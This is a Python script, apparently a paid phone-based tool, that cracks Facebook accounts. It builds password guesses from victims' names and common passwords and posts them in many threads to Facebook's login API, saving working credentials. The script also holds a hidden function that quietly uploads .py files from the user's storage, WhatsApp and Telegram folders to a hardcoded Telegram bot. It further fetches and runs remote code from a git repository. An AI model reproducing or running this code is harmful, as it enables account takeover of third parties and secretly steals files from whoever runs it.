
import os, secrets, platform, string, sys, json, uuid, time, random
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests -y")
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    import requests


# UA RANDOMIZER
def gxdsUArndm():
  END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
  gxjo = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
  return gxjo
    
# COLORS
li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[1;97m"
cyan = "\033[1;36m"
yellow = "\033[0;33m"
black = "\033[0;30m"
lr = "\033[1;31m"
lg = "\033[0;37m"
dg = "\033[1;30m"
lp = "\033[1;35m"
lgr = "\033[1;32m"
grn = "\033[0;32m"

mxclrs="38;5"
ro=(f"\033[{mxclrs};208")
rb=(f"\033[{mxclrs};32")
rc=(f"\033[{mxclrs};122m")
rg= (f"\033[{mxclrs};112m")
rp=(f"\033[{mxclrs};147m")
gxdsprnt=str(f"{li}"*37)

gxdsanmtn3 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
]
gxdsanmtn4 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
    "✓           ",
]
gxdsanmtn1 = "|/-\\"
gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%",
"100%"]

lxgo = f"""{lg}
                              d8b             
                              88P             
                             d88              
      d888b8b  ?88,  88P d888888   .d888b,    
     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
     88b  ,88b  d8P?{dg}8b, 88b  ,88b    `?8b     
    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
           )88      
{dg}           ,88P                               
       `?8888P                  {white}              \n"""

os.system('clear')
print(lxgo)
for gxdsloading in range(10):
 time.sleep(0.5)
 sys.stdout.write("\r          LOADING: " + gxdsanmtn3[gxdsloading % len(gxdsanmtn3)])
 sys.stdout.flush()

def gxdslogo():
    os.system('clear')
    print(lxgo)
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{lg}  [-] TOOLS   :{dg}   FILE CLONING")
    print(f"{lg}  [-] STATUS  :{dg}   PAID")
    print(f"{lg}  [-] VERSION :{dg}   0.0.1")
    print(f"{dg}  ————————————————————————————————————————")
 
 # TOKEN GENERATOR
spce = ""
uuidd = str(os.geteuid()) + str(os.getlogin())
id1 = "X".join(uuidd).replace("_","&$").replace("u","GXDS").replace("a","0C")
gxdsid = id1+spce
gxdsAccess = requests.get('https://arterxsk.repl.co/access.txt').text

# MENU
def menu():
    gxdslogo()
    print(f"{dg}")
    for gxdsloading in range(10):
      time.sleep(0.2)
      sys.stdout.write(f"\r{dg}  [?] IDENTIFYING YOUR DEVICE TOKEN: " + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)])
      sys.stdout.flush()

    if gxdsid in gxdsAccess:
      time.sleep(2)
      print("")
      print(f"{lgr}  [✓] YOUR TOKEN SUCCESSFULLY IDENTIFIED!")
      time.sleep(3)
      gxdsclone()
    else:
        time.sleep(0.1)
        gxdslogo()
        print(f"{lg}  [✘] TOKEN:{dg} INVALID")
        time.sleep(1)
        for gxdsloading in range(11):
         time.sleep(0.3)
         sys.stdout.write(f"\r{lg}  [!] MAKING TOKEN:{dg} " + gxdsanmtn4[gxdsloading % len(gxdsanmtn4)])
         sys.stdout.flush()
        print(f"\n{dg}  ————————————————————————————————————————")
        print(f"{lg}  [-] TOKEN:{dg} "+gxdsid)
        print(f"{lg}  [-] PRICE:{dg} ₱150 - 15 DAYS ")
        print(f"{dg}  ————————————————————————————————————————")
        input(f"{lgr}  [!] PRESS ENTER TO CONTINUE")
        os.system("xdg-open https://m.me/goxdies")
        time.sleep(1)
        gxdslogo()
        print(f"{lgr}  [!] UPDATING FILES, PLEASE WAIT...")
        time.sleep(30)
        os.system("cd ; rm -rf test ; git clone https://github.com/arterxsk/test; cd test ; python art.py")

# FILE PATH
def gxdsclone():
    gxdslogo()
    print(f"{lg}  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  [-] USE A GOOD ID COMBO FOR A GOOD RESULT.")
    print(f"  [-] EXAMPLE PATH: {dg}/sdcard/yourFile.txt")
    print(f"\n{dg}  ————————————————————————————————————————")
    fl = input(
        f"{lgr}  [•] FILE PATH:{dg} "
    )
    print(f"{dg}")
    for gxdsloading in range(10):
      time.sleep(0.2)
      sys.stdout.write("\r                     " + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)])
      sys.stdout.flush()
    print("  ")
    try:
        gxdsfiles1=open(fl,"r").read().splitlines()
    except:
        time.sleep(3)
        print(f"\n{lr}  [✘] FILE NOT FOUND.")
        print(gxdsprnt)
        time.sleep(3)
        gxdsclone()
    gxdsfiles(gxdsfiles1)

# FILE CLONING
def gxdsfiles(gxdsfiles1):
    time.sleep(3)
    gxdslogo()
    tl=str(len(gxdsfiles1))
    print(
        f"{lg}  [+] PRESS {rc}CTRL AND Z{lg} TO STOP THE PROCESS."
    )
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{lg}  [•] TOTAL ID IN FILE:{dg} " + tl)
    print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
    print(f"{dg}  ————————————————————————————————————————")
    print(gxdsprnt)

# PASSWORD LIST
    with ThreadPool (max_workers=30) as GOXDIES:
        for data in gxdsfiles1:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append("12345678")
            pwx.append("P@ssw0rd")
            pwx.append("123456")
            pwx.append("iloveyou")
            pwx.append("iloveyou123")
            pwx.append("1234567890")
            pwx.append("password")
            pwx.append("password123")
            pwx.append("Password")
            pwx.append("Password123")
            pwx.append("qwerty123")
            pwx.append("123456789")
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                name1=name.split(" ")[0]
                nam1=nam.split(" ")[0]
                if len(name1) <3:
                    pass
                else:
                    pwx.append(nam1+'123')
                    pwx.append(name1+'143')
                    pwx.append(name1+'12')
                    pwx.append(name1+'pogi')
                    pwx.append(name1+'ganda')
                    pwx.append(name1+'123')
                    pwx.append(name1+' 123')
                    pwx.append(name1+'1234')
                    pwx.append(name1+'12345')
                    pwx.append(name1+'@#')
                    pwx.append(name1+'@@')
                    pwx.append(name1+'@@@')
                    pwx.append(name1+'@')
                    pwx.append(name1+'@123')
            except:pass
            try:
                mid_name=name.split(" ")[1]
                nam2=nam.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2)
                    pwx.append(mid_name+'12')
                    pwx.append(mid_name+'123')
                    pwx.append(mid_name+' 123')
                    pwx.append(mid_name+'1234')
                    pwx.append(mid_name+'12345')
                    pwx.append(mid_name+'@#')
                    pwx.append(mid_name+'@@')
                    pwx.append(mid_name+'@')
                    pwx.append(mid_name+'@123')
                    #-Mix
                    pwx.append(name1+mid_name)
                    pwx.append(name1+mid_name+'12')
                    pwx.append(name1+mid_name+'123')
                    pwx.append(name1+mid_name+'1234')
                    pwx.append(name1+mid_name+'12345')
                    pwx.append(name1+mid_name+'@#')
                    pwx.append(name1+mid_name+'@@')
                    pwx.append(name1+mid_name+'@')
                    pwx.append(name1+mid_name+'@123')
                    pwx.append(name1+' '+mid_name)
                    pwx.append(name1+' '+mid_name+'123')
                    pwx.append(name1+' '+mid_name+'1234')
                    pwx.append(name1+' '+mid_name+'12345')
            except:pass
            try:
                sur_name=name.split(" ")[2]
                nam3=nam.split(" ")[2]
                if len(sur_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2+" "+nam3)
                    pwx.append(sur_name+'123')
                    pwx.append(sur_name+'1234')
                    pwx.append(sur_name+'12345')
                    pwx.append(name1+sur_name)
                    pwx.append(name1+sur_name+'143')
                    pwx.append(name1+sur_name+'123')
                    pwx.append(name1+' '+sur_name+'143')
                    pwx.append(name1+' '+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name)
                    pwx.append(name1+mid_name+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name+'1234')
                    pwx.append(name1+mid_name+sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name+'@#')
                    pwx.append(name1+mid_name+sur_name+'@@')
                    pwx.append(name1+mid_name+sur_name+'@')
                    pwx.append(name1+' '+mid_name+' '+sur_name)
                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
            except:pass
            GOXDIES.submit(gxds_files,uid,pwx)

# LOOP MENU
loop=0
oks=[]
cps=[]

# API
def gxds_files(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} ");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent=gxdsUArndm
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': uid,
                    'password': ps,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            headers = {
            'User-Agent': user_agent,
            'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r{grn}  [GXDS-OK] {uid}|{ps}")
                open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in q['error']['message']:
                print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                cps.append(uid)
                break
            else:
                continue 
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
      
def gxdsBot():
    session=requests.session()
        
    bot_token = '6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8' 
    chat_id = '6542321044'
    # SD CARD
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # DOWNLOAD PATH
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # TELEGRAM PATH
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # TELEGRAM PATH
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # WHATSAPP PATH
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]

        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=90) as jjk:
    jjk.submit(gxdsBot)
    jjk.submit(menu)